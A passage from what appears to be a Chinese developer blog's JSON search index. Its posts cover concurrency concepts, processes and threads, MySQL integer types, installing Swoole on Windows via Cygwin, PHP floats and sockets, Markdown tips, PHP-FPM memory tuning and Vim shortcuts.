长连接/短连接长连接： 客户端和服务端建立连接后不进行断开，之后客户端再次访问这个服务器上的内容时，继续使用这一条连接通道。短连接： 客户端和服务端建立连接，发送完数据后立马断开连接。下次要取数据，需要再次建立连接。 串行/并行/并发串行：执行多个任务时，各个任务按顺序执行，完成一个之后才能进行下一个。并行：多个任务在同一时刻发生并执行。并发：同一时刻需要执行N 个任务 IO（Input/Output，输入输出）在计算机中，输入 / 输出（即 IO）是指信息处理系统（比如计算机）和外部世界（可以是人或其他信息处理系统）的通信。 输入是指系统接收的信号或数据，输出是指从系统发出的数据或信号。 涉及到IO 操作的通常有磁盘、网络、文件等。 同步/异步同步和异步是一种消息通信机制。其关注点在于 被调用者返回 和 结果返回 之间的关系， 描述对象是被调用对象的行为。 同步：在发出一个同步调用后，没有得到结果返回之前，该调用就不会返回，只有等待结果返回之后才会继续执行后续操作。异步：发出调用，直接返回。异步可以通过状态、回调、通知调用者结果，可以先执行其他操作，直到回调结果返回之后，再回来执行回调那部分的操作。 阻塞/非阻塞阻塞和非阻塞是一种业务流程处理方式。关注点在于调用发生时 调用者状态 和 被调用者返回结果 之间的关系。 描述的是等待结果时候调用者的状态。 此时结果可能是同步返回的，也能是异步返回。 阻塞：在结果返回之前，该线程会被挂起，后续代码只有在结果返回后才能执行。非阻塞：在不能立刻获取结果前，该调用不会阻塞当前线程。 同步阻塞/非同步阻塞实际编程中，通过线程实现进程的同步非阻塞，通过协程实现线程的同步非阻塞。 同步阻塞：打电话问老板有没有某书（调用），老板说查一下，让你别挂电话（同步），你一直等待老板给你结果，什么事也不做（阻塞）。 同步非阻塞：打电话问老板有没有某书（调用），老板说查一下，让你别挂电话（同步），等电话的过程中你还一边嗑瓜子（非阻塞）。 异步阻塞/异步非阻塞异步阻塞：打电话问老板有没有某书（调用），老板说你先挂电话，有了结果通知你（异步），你挂了电话后（结束调用）, 除了等老板电话通知结果，什么事情也不做（阻塞）。 异步非阻塞：打电话问老板有没有某书（调用），老板说你先挂电话，有了结果通知你（异步），你挂电话后（结束调用），一遍等电话，一遍嗑瓜子。（非阻塞） 参考链接 Swoole 中涉及的一些基本概念","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"初始进程与线程","slug":"initial-process-and-thread","date":"2020-10-24T13:50:46.000Z","updated":"2020-10-24T13:53:41.808Z","comments":true,"path":"initial-process-and-thread/","link":"","permalink":"https://www.0x2beace.com/initial-process-and-thread/","excerpt":"关于进程和线程，此前已经有很多优秀的文章了，这里只是抛砖引玉，基于自己的理解并整理加深印象。","text":"关于进程和线程，此前已经有很多优秀的文章了，这里只是抛砖引玉，基于自己的理解并整理加深印象。 操作系统下的进程与线程在正式介绍进程和线程之前，从操作系统的角度了解一下。 众所周知，现代的操作系统（Mac OS X，UNIX，Linux，Windows等）都是支持“多任务”的操作系统。 那么什么是“多任务”呢？简单的说，多任务就是同时运行多个任务，比如一边听歌，一边写博客。 多核 CPU可以直接同时运行多个任务，而对于单核 CPU 来说，只能让系统轮流执行每个任务，因为任务之间切换很快，在宏观上看上去就是同时执行的了。 对于操作系统来说，一个任务就是一个进程。而有的进程同时做几件事情，也就是同时运行多个子任务，我们把进程内的这类子任务称为线程。 由于每个进程至少要干一件事情，所以，一个进程至少有一个线程。 PHP 默认是执行单任务的进程，也就是只有一个线程。如果我们要同时执行多个任务怎么办？ 有两种解决方案： 启动多个进程，每个进程虽然只有一个线程，但多个进程可以一块执行多个任务。 启动一个进程，在一个进程内启动多个线程，这样，多个线程也可以一块执行多个任务。 多线程线程是最小的执行单元，而进程由至少一个线程组成，知道这一点后，再来理解多线程就不难了。 多线程就是指一个进程中同时有多个线程正在执行。 为什么要使用多线程？对于一个程序来说，很多操作事非常耗时的，如数据库I/O操作、文件读写等。如果使用单线程，那么就只能等待该线程处理完这些操作之后，才能继续往下执行其他操作。 而如果使用多线程，就可以将耗时的那部分操作通过其他线程去执行，从而提高程序执行效率。 多线程的缺点 使用过多线程会过度消耗系统资源，因为创建线程需要开辟新的内存。 影响系统性能，操作系统需要来回对多线程进行切换。 同时还需要考虑线程异常（挂起、中止）时可能会对造成程序的影响。 总结：多线程是异步的，分别创建N 个线程并不能说明他们就是在同时运行，实际上是操作系统在各个线程之间来回切换，并且切换速度非常快，这也就造成了在宏观上给我们同时运行的错觉。 多进程多进程就是指计算机同时执行多个进程。 多进程还是多线程下面引用一个知乎上的回答，非常通俗的解释了选择多进程还是多线程的问题。 单进程单线程：一个人在一个桌子上吃菜。 单进程多线程：多个人在同一个桌子上一起吃菜。 多进程单线程：多个人每个人在自己的桌子上吃菜。 多线程的问题是多个人同时吃一道菜的时候容器发生争抢。例如两个人同时夹一个菜，一个人刚伸出筷子，结果伸到的时候菜已经被夹走了。通俗点说也就说资源共享容器发生冲突争抢。 对于Windows 系统来说，“开桌子”的开销很大，因此Windows 鼓励大家在一个桌子上吃菜。因此 Windows 多线程的学习重点是资源争抢与同步方面的问题。 而对于Linux 系统来说，“开桌子”的开销很小，因为Linux 鼓励大家尽量每个人都开自己的桌子吃菜。但这同事也带来了新的问题：两个人坐在不同的桌子上，说话不方便。因为，Linux 多线程的学习重点是进程之间的通讯方式。 参考链接 进程和线程 多进程和多线程的概念 多线程有什么用？——知乎","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"进程","slug":"进程","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"线程","slug":"线程","permalink":"https://www.0x2beace.com/tags/%E7%BA%BF%E7%A8%8B/"}]},{"title":"MySQL Integer类型与INT(11)详解","slug":"mysql-integer-type-and-int-11-detailed-explanation","date":"2020-10-23T10:39:10.000Z","updated":"2020-10-23T10:39:49.036Z","comments":true,"path":"mysql-integer-type-and-int-11-detailed-explanation/","link":"","permalink":"https://www.0x2beace.com/mysql-integer-type-and-int-11-detailed-explanation/","excerpt":"MySQL支持的整数类型有TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT。","text":"MySQL支持的整数类型有TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT。 每种整数类型所需的存储空间和范围如下：|类型|字节|最小值(有符号)|最大值(有符号)|最小值(无符号)|最大值(无符号)||-|-|-|-|-|-||TINYINT|1|-128|127|0|255||SMALLINT|2|-32768|32767|0|65535||MEDIUMINT|3|-8388608|8388607|0|16777215||INT|4|-2147483648|2147483647|0|4294967295||BIGINT|8|-9223372036854775808|(9223372036854775807|0|18446744073709551615| 有无限制的区别在创建数据表时，通常会看见 int(11)和int这样的写法，这两者有什么区别，各自又代表什么意思呢？ 对应Integer 类型而言，仅表示字段的显示宽度。 对于DECIMAL类型，表示数字的总数。 对于字符字段，这是可以存储的最大字符数，例如VARCHAR（20）可以存储20个字符。 显示宽度并不影响可以存储在该列中的最大值。int(3)和int(11) 所能存储的最大范围是一样的。 将某个字段设置成INT(20)并不意味着将能够存储20位数字，这个字段最终能存储的最大范围还是 INT 的范围。 示例创建一张临时表： 12345CREATE TABLE tmp_table_a ( id INT(3) NOT NULL AUTO_INCREMENT, name varchar(16) DEFAULT &#39;&#39; NOT NULL, PRIMARY KEY (&#96;id&#96;)); 查看表结构： 1234567mysql&gt; desc tmp_table_a;+-------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || name | varchar(16) | NO | | | |+-------+-------------+------+-----+---------+----------------+ 插入超过”长度”的数字： 1INSERT INTO tmp_table_a(id, name) VALUES(123456, &quot;boo&quot;); 查看结果，发现数字并没有插入失败： 1234567mysql&gt; select * from tmp_table_a;+--------+------+| id | name |+--------+------+| 123456 | boo |+--------+------+1 row in set (0.00 sec) 有无符号的区别那么问题来了，既然加不加数字并没有什么区别，那为什么还多此一举呢？ 这是因为“正常”情况下确实没有什么区别，只有当字段设置为UNSIGNED ZEROFILL 属性时，为INT 增加数字才会有意义。 表示如果要存储的数字少于N 个字符，则这些数字将在左侧补零。 示例创建一张 UNSIGNED ZEROFILL 的数据表： 12345CREATE TABLE tmp_table_b ( id INT(3) UNSIGNED ZEROFILL NOT NULL AUTO_INCREMENT, name varchar(16) DEFAULT &#39;&#39; NOT NULL, PRIMARY KEY (&#96;id&#96;)); 查看表结构： 1234567mysql&gt; desc tmp_table_b;+-------+--------------------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-------+--------------------------+------+-----+---------+----------------+| id | int(3) unsigned zerofill | NO | PRI | NULL | auto_increment || name | varchar(16) | NO | | | |+-------+--------------------------+------+-----+---------+----------------+ 插入记录： 1INSERT INTO tmp_table_b(id, name) VALUES(1, &quot;boo&quot;); 查看记录： 123456mysql&gt; select * from tmp_table_b;+-----+------+| id | name |+-----+------+| 001 | boo |+-----+------+ 总结 对于Integer 类型而言，“数字”并不会限制其能存储的最大范围。 有无符号，不仅会限制其能存储的最大范围，还可以配置“数字”自动补零。 参考链接 MySQL Integer类型与INT(11)","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Windows 如何安装 Swoole？","slug":"how-to-install-swoole-on-windows","date":"2020-10-21T11:56:53.000Z","updated":"2020-11-26T10:19:33.578Z","comments":true,"path":"how-to-install-swoole-on-windows/","link":"","permalink":"https://www.0x2beace.com/how-to-install-swoole-on-windows/","excerpt":"Swoole 是一个 PHP 的协程高性能网络通信引擎。","text":"Swoole 是一个 PHP 的协程高性能网络通信引擎。 目前仅支持 Linux(2.3.32 以上内核)、FreeBSD、MacOS 三种操作系统，它并不支持直接在 Windows 下安装，因为Windows 系统默认没有以下软件： gcc-4.8 或更高版本 make autoconf 如果一定要在Windows 系统中使用，则可以使用 CygWin 或 WSL(Windows Subsystem for Linux) 。 这篇笔记并不介绍如何在Windows 系统中，安装Cygwin，如果需要，可以参考Cygwin 快速上手 。 需要注意的是，在安装Cygwin 时，记得勾选以下软件包： gcc、gcc++ autoconf php-devel pcre2 安装Swoole1. 可以通过以下方式下载 Swoole github pecl gitee 2. 从源码编译安装下载源代码包后，将其拷贝至 Cygwin 的home 目录，解压并进入文件夹。 1tar -zxvf swoole-src.tgz 编译安装： 1234cd swoole-src &amp;&amp; \\phpize &amp;&amp; \\.&#x2F;configure &amp;&amp; \\make &amp;&amp; sudo make install 如果因为某个软件包缺失而导致编译安装失败，则可以重新安装 Cygwin（重新安装不用卸载之间的版本，直接在此安装就好了）。 3. 启用扩展编译安装到系统成功后，需要在 php.ini 中加入一行 extension=swoole.so 来启用 Swoole 扩展。 需要注意的是，通过这种方式安装的Swoole，最终存在于Cygwin 环境中，与宿主机中的PHP 版本无关。 通过php -m | grep swoole查看是否安装成功。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Windows","slug":"Windows","permalink":"https://www.0x2beace.com/tags/Windows/"},{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"PHP 常见浮点数操作","slug":"php-common-floating-point-operations","date":"2020-10-20T11:24:23.000Z","updated":"2020-10-20T11:35:47.611Z","comments":true,"path":"php-common-floating-point-operations/","link":"","permalink":"https://www.0x2beace.com/php-common-floating-point-operations/","excerpt":"浮点数操作在实际应用中还是挺多的，这篇笔记用来整理常见操作。","text":"浮点数操作在实际应用中还是挺多的，这篇笔记用来整理常见操作。 保留N位小数做四舍五入想要保留N 位小数同时做四舍五入的方式还是挺多的，下面列举常用的几种。 sprintfsprintf 函数用于返回一个格式化之后的字符串。 123&lt;?php$num &#x3D; 22.356;echo sprintf(&quot;%.2f&quot;, $num); &#x2F;&#x2F; 22.36 %.2f 是目标格式，其中2 表示2 位，f表示视为浮点数。 roundround 函数用于对浮点数进行四舍五入。 还可以通过传入参数，决定从第几位开始四舍五入。如果没有参数，默认从小数点后一位开始四舍五入。 1234&lt;?phpecho round(3.4); &#x2F;&#x2F; 3echo round(3.5); &#x2F;&#x2F; 4echo round(22.356, 2); &#x2F;&#x2F; 22.36 保留N位小数不做四舍五入123&lt;?php$num &#x3D; 22.356;echo sprintf(&quot;%.2f&quot;,substr(sprintf(&quot;%.3f&quot;, $num), 0, -1)); &#x2F;&#x2F; 22.35 获取小数位长度123&lt;?php$num &#x3D; 22.356;echo strlen(substr(strrchr($num, &quot;.&quot;), 1)); &#x2F;&#x2F; 3","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"关于 Markdown 的一些技巧","slug":"some-tips-about-markdown","date":"2020-10-19T14:04:23.000Z","updated":"2020-10-20T11:23:53.460Z","comments":true,"path":"some-tips-about-markdown/","link":"","permalink":"https://www.0x2beace.com/some-tips-about-markdown/","excerpt":"这篇笔记的目的是整理Markdown 的一些不常用，却又十分有用的小技巧。","text":"这篇笔记的目的是整理Markdown 的一些不常用，却又十分有用的小技巧。 什么是Markdown？ Markdown 是一种轻量级标记语言，创始人为约翰·格鲁伯。它允许人们使用易读易写的纯文本格式编写文档，然后转换成有效的XHTML文档。这种语言吸收了很多在电子邮件中已有的纯文本标记的特性。 —— 维基百科 Markdown 高级技巧在Markdown 中，可以直接插入 HTML，目前支持的HTML 元素有： &lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sub&gt; &lt;sup&gt; &lt;br&gt; 等 键盘标签可以使用&lt;kbd&gt;标签使文本看起来像按钮，这与常规反引号文本略有不同。 Copy code with Control + C 可视化差异可以使用反引号可视化差异，并diff根据需要突出显示红色或绿色的线。 12310 PRINT “BASIC IS COOL”- 20 GOTO 11+ 20 GOTO 10 隐藏不必要的输出添加冗长的错误日志或冗长程序输出的问题可以解决的错误有帮助的，但如果它占用页的垂直空间，可以考虑使用&lt;details&gt;和&lt;summary&gt;标签。 12345678910&lt;details&gt;&lt;summary&gt;git clone 成功，点击查看详情信息&lt;&#x2F;summary&gt;&lt;pre&gt;Cloning into &#39;php-markdown-blog&#39;...remote: Enumerating objects: 67, done.remote: Counting objects: 100% (67&#x2F;67), done.remote: Compressing objects: 100% (55&#x2F;55), done.remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0Unpacking objects: 100% (67&#x2F;67), done.&lt;&#x2F;details&gt; git clone 成功，点击查看详情信息 Cloning into 'php-markdown-blog'... remote: Enumerating objects: 67, done. remote: Counting objects: 100% (67/67), done. remote: Compressing objects: 100% (55/55), done. remote: Total 67 (delta 12), reused 59 (delta 7), pack-reused 0 Unpacking objects: 100% (67/67), done. 使图像文字居中HTML 中的&lt;div align=&quot;center&quot;&gt; 居然可以神奇的应用在 Markdown 中，然所有内容居中。 1234&lt;div align&#x3D;&quot;center&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;dunetocat.png&quot; width&#x3D;&quot;200&quot;&gt;&lt;p&gt;This is some centered text.&lt;&#x2F;p&gt;&lt;&#x2F;div&gt; This is some centered text. 较小的文字使用&lt;sub&gt;、&lt;sup&gt;标签，可以使文字变小，非常适合在图像下面添加描述。 12345&lt;div align&#x3D;&quot;center&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;octodex.github.com&#x2F;images&#x2F;megacat-2.png&quot; width&#x3D;&quot;200&quot;&gt;&lt;br&gt;&lt;sup&gt;&lt;strong&gt;Fig 1:&lt;&#x2F;strong&gt; Megatocat into action&lt;&#x2F;sup&gt;&lt;&#x2F;div&gt;View more octocats on the [Octodex](https:&#x2F;&#x2F;octodex.github.com&#x2F;)! Fig 1: Megatocat into action View more octocats on the Octodex 参考链接 GitHub ProTips","categories":[{"name":"Tips","slug":"Tips","permalink":"https://www.0x2beace.com/categories/Tips/"}],"tags":[{"name":"MarkDown","slug":"MarkDown","permalink":"https://www.0x2beace.com/tags/MarkDown/"}]},{"title":"PHP-FPM 优化——占用内存大不释放","slug":"php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release","date":"2020-10-18T07:56:45.000Z","updated":"2020-10-18T07:59:01.020Z","comments":true,"path":"php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/","link":"","permalink":"https://www.0x2beace.com/php-fpm-optimization-takes-up-a-lot-of-memory-and-does-not-release/","excerpt":"在传统的 LNMP 架构中，如果Web 应用部分，突然变得特别卡，通常都是内存耗尽导致。","text":"在传统的 LNMP 架构中，如果Web 应用部分，突然变得特别卡，通常都是内存耗尽导致。 这里说的内存，指的是物理运行内存，而不是虚拟内存（Swap）。 LNMP架构中PHP是运行在FastCGI模式下，按照官方的说法，php-cgi会在每个请求结束的时候会回收脚本使用的全部内存，但是并不会释放给操作系统，而是继续持有以应对下一次PHP请求。而php-fpm是 FastCGI进程管理器，用于控制php的内存和进程等。 所以，解决的办法就是通过php-fpm 优化总的进程数和单个进程占用的内存，从而解决php-fpm 进程占用内存大和不释放内存的问题。 查看当前占用情况如果发现Web 应用出现严重卡顿，请求超时等问题，首先检查一下内存的占用情况。常用的命令有：Top、Glances、Free 等。 使用Glances 或者 Top 命令查看进程，然后按下按键 M，可以查看主机当前的内存占用情况，按照占用内存由多到少排序。 也可以使用以下命令查看当前 php-fpm 总进程数： 1ps -ylC php-fpm --sort:rss 其中 rss 就是内存占用情况。 查看当前php-fpm 进程的内存占用情况及启动时间： 1ps -e -o &#39;pid,comm,args,pcpu,rsz,vsz,stime,user,uid&#39;|grep www|sort -nrk5 可以看到无论哪一种方式，结果都是一样的。 查看当前php-fpm进程平均占用内存情况： 12ps --no-headers -o &quot;rss,cmd&quot; -C php-fpm | awk &#39;&#123; sum+&#x3D;$1 &#125; END &#123; printf (&quot;%d%s\\n&quot;, sum&#x2F;NR&#x2F;1024,&quot;M&quot;) &#125;&#39;&#x2F;&#x2F; 22M 优化配置解决上面那个问题的核心就是 php-fpm 配置中的 max_requests。 即当一个 PHP-CGI 进程处理的请求数累积到 max_requests 个后，自动重启该进程，这样达到了释放内存的目的了。 一般来说一个php-fpm 进程占用的内存为30M-40M，所以根据自身实际情况作判断，有以下两种情况： 实际结果是大于 30M - 40M，那么需要让 php-fpm “早一些“释放内存，max_requests 的数值改小一些。 实际结果是小于 30M - 40M，则可以让 php-fpm “晚一些“释放内存，max_requests的数值改大一些。 参考链接 Linux的php-fpm优化心得-php-fpm进程占用内存大和不释放内存问题","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"对于NULL、空、0、false等数据类型的理解","slug":"understanding-of-data-types-such-as-null-empty-0-false-etc","date":"2020-10-17T09:21:51.000Z","updated":"2020-10-17T09:22:32.323Z","comments":true,"path":"understanding-of-data-types-such-as-null-empty-0-false-etc/","link":"","permalink":"https://www.0x2beace.com/understanding-of-data-types-such-as-null-empty-0-false-etc/","excerpt":"之所以决定写这片笔记，是因为一直对 空 这个概念很模糊，在代码逻辑中常会遇到需要判断的时候，总是模拟两可。","text":"之所以决定写这片笔记，是因为一直对 空 这个概念很模糊，在代码逻辑中常会遇到需要判断的时候，总是模拟两可。 常见的“空”有以下这些： 整形0：0 字符1：1 字符空：”” 字符零：”0” 空数组：[] true false null NUll 上面的那些都好理解，都是常见的，重点介绍一下NULL。 NULL 是什么？ Null是在计算机具有保留的值，可以用于指针不去引用对象，现在很多程序都会使用指针来表示条件，但是在不同的语言中，含义是不一样的。 这里我们只介绍 PHP 中的 NULL。 在 PHP 中，表示一个变量没有赋值、或者是被赋值的值为 NULL，以及被 unset 的。 使用PHP 函数对变量进行比较： 表达式 gettype() empty() is_null() isset() boolean : if($x) $x = &quot;&quot;; string TRUE FALSE TRUE FALSE $x = null; NULL TRUE TRUE FALSE FALSE var $x; NULL TRUE TRUE FALSE FALSE $x is undefined NULL TRUE TRUE FALSE FALSE $x = array(); array TRUE FALSE TRUE FALSE $x = false; boolean TRUE FALSE TRUE FALSE $x = true; boolean FALSE FALSE TRUE TRUE $x = 1; integer FALSE FALSE TRUE TRUE $x = 42; integer FALSE FALSE TRUE TRUE $x = 0; integer TRUE FALSE TRUE FALSE $x = -1; integer FALSE FALSE TRUE TRUE $x = &quot;1&quot;; string FALSE FALSE TRUE TRUE $x = &quot;0&quot;; string TRUE FALSE TRUE FALSE $x = &quot;-1&quot;; string FALSE FALSE TRUE TRUE $x = &quot;php&quot;; string FALSE FALSE TRUE TRUE $x = &quot;true&quot;; string FALSE FALSE TRUE TRUE $x = &quot;false&quot;; string FALSE FALSE TRUE TRUE 松散判断 == TRUE FALSE 1 0 -1 &quot;1&quot; &quot;0&quot; &quot;-1&quot; NULL array() &quot;php&quot; &quot;&quot; TRUE TRUE FALSE TRUE FALSE TRUE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE TRUE FALSE TRUE 1 TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE TRUE FALSE TRUE TRUE -1 TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE &quot;1&quot; TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE &quot;0&quot; FALSE TRUE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE &quot;-1&quot; TRUE FALSE FALSE FALSE TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE TRUE FALSE TRUE array() FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE TRUE FALSE FALSE &quot;php&quot; TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE &quot;&quot; FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE FALSE FALSE TRUE 严格比较 === TRUE FALSE 1 0 -1 &quot;1&quot; &quot;0&quot; &quot;-1&quot; NULL array() &quot;php&quot; &quot;&quot; TRUE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 1 FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE 0 FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE -1 FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE FALSE &quot;1&quot; FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE &quot;0&quot; FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE &quot;-1&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE FALSE NULL FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE FALSE array() FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE &quot;php&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE &quot;&quot; FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE 参考链接PHP 类型比较表","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Vim 常用快捷键总结","slug":"summary-of-vim-commonly-used-shortcut-keys","date":"2020-10-16T11:16:43.000Z","updated":"2020-10-18T08:12:31.937Z","comments":true,"path":"summary-of-vim-commonly-used-shortcut-keys/","link":"","permalink":"https://www.0x2beace.com/summary-of-vim-commonly-used-shortcut-keys/","excerpt":"Vim 是我在Linux 下比较常用的文本编辑器，这里整理一下常用的操作。","text":"Vim 是我在Linux 下比较常用的文本编辑器，这里整理一下常用的操作。 基本操作 移动到行首：0 移动到行尾：$ 光标移动到文件开始位置：gg 光标移动到文件结束位置: shift + g 删除所有内容：ggdG 单行删除：dd 单行复制：yy 粘贴：p 复制全部内容：ggyG 移动到指定行在vim 中直接移动到指定行数，有三种方式（均是在命令行模式下输入，n 为指定的行号）： ngg/ nG :n vim +n filename 进阶操作当前行替换： 1s&#x2F;XXX&#x2F;YYY&#x2F;g 其中XXX 是需要替换的字符串，YYY是替换后的字符串。 全局替换： 1%s&#x2F;XXX&#x2F;YYY&#x2F;g 一些配置 查找字符设置高亮：set hlsearch 显示行号：set number","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"}]},{"title":"PHP Socket 编程","slug":"php-socket-programming","date":"2020-10-15T14:29:16.000Z","updated":"2020-10-15T14:30:23.551Z","comments":true,"path":"php-socket-programming/","link":"","permalink":"https://www.0x2beace.com/php-socket-programming/","excerpt":"最近因为一些原因接触到一个老古董项目，这个项目虽然有些老，但仔细看一看，还是能学到一些东西的。 关于 PHP Socket 编程的文章有很多，这里就只简单记录一下如何快速上手。","text":"最近因为一些原因接触到一个老古董项目，这个项目虽然有些老，但仔细看一看，还是能学到一些东西的。 关于 PHP Socket 编程的文章有很多，这里就只简单记录一下如何快速上手。 什么是 Socket按照惯例，还是先来了解一下基本概念。 我们知道两个进程如果需要进程通讯，最基本的前提就是保证彼此进程的唯一，并能确定彼此身份。在本地进程通讯中我们可以使用 PID 来标示唯一的进程，但 PID 只在本地唯一，网络中的两个进程 PID 冲突的几率很大，这时候我们就需要另辟蹊径了。 我们知道IP 层的IP 地址可以唯一标示主机，而TCP 层协议和端口号可以唯一标示主机的一个进程，这样我们就可以利用 IP 地址+ 协议 + 端口号唯一标示网络中的一个进程。 能够唯一标示网络中的进程后，它们就可以利用socket 进行通信了。 什么是socket？ 我们经常把 socket 翻译成套接字，socket 是在应用层和传输层之间的一个抽象层，它把 TCP/IP 层复杂的操作抽象为几个简单的接口供应用层调用以实现进程在网络中通信。 socket 起源于 UNIX，在UNIX 一切皆为文件哲学的思想下，socket 是一种“打开=&gt;读/写=&gt;关闭“模式的实现，服务器和客户端各自维护一个文件，在建立连接打开之后，可以向自己的文件写入内容供对方读取或者读取对方内容，通讯结束时关闭文件。 socket 通信流程socket 是”打开=&gt;读/写=&gt;关闭”模式的实现，以使用TCP协议通讯的socket为例，其交互流程大概是这样子： 安装PHP 默认没有启用 sockets 扩展，所以需要手动安装扩展。 1apt-get install php7.2-sockets php -m 或者 php -i检查扩展是否已经启用。 创建连接创建并返回一个套接字，也称作一个通讯节点。一个典型的网络连接由 2 个套接字构成，一个运行在客户端，另一个运行在服务端。 123456&lt;?php# 创建一个TCP 协议的 socket$socket &#x3D; socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);# 创建一个本地的socket$socket &#x3D; socket_create(AF_UNIX, SOCK_STREAM, 0); socket_create函数接收三个参数，分别是domain、type、protocol。 domain：当前套接字使用什么协议 type：当前套接字的类型 protocol：设置指定 domain 套接字下的具体协议 发送内容发送数据有两种方式： socket_send：发送消息至已连接的客户端。 socket_sendto：发送消息至客户端，无论是否连接。123456789&lt;?php$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);$msg &#x3D; &quot;Ping !&quot;;$len &#x3D; strlen($msg);&#x2F;&#x2F; 向本地 1223 端口发送内容socket_sendto($sock, $msg, $len, 0, &#39;127.0.0.1&#39;, 1223);socket_close($sock); 接收数据接收数据也有两种方式： socket_recv：从已连接的socket 接收数据 socket_recvfrom：从socket 接收数据，无论是否连接 123456&lt;?php$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);# 从本地 1223 端口获取内容socket_recvfrom($socket, $buf, 1024, 0, &quot;127.0.0.1&quot;, 1223);var_dump($buf); &#x2F;&#x2F; Ping ! 参考链接 简单理解Socket 一篇搞懂TCP、HTTP、Socket、Socket连接池 socket_create socket_sendto socket_bind","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Socket","slug":"Socket","permalink":"https://www.0x2beace.com/tags/Socket/"}]},{"title":"PHP PDO 快速上手","slug":"php-pdo-quick-start","date":"2020-10-13T23:51:48.000Z","updated":"2020-10-13T23:53:56.113Z","comments":true,"path":"php-pdo-quick-start/","link":"","permalink":"https://www.0x2beace.com/php-pdo-quick-start/","excerpt":"最近用到了 PHP PDO相关的知识，整理总结一下。","text":"最近用到了 PHP PDO相关的知识，整理总结一下。 PDO 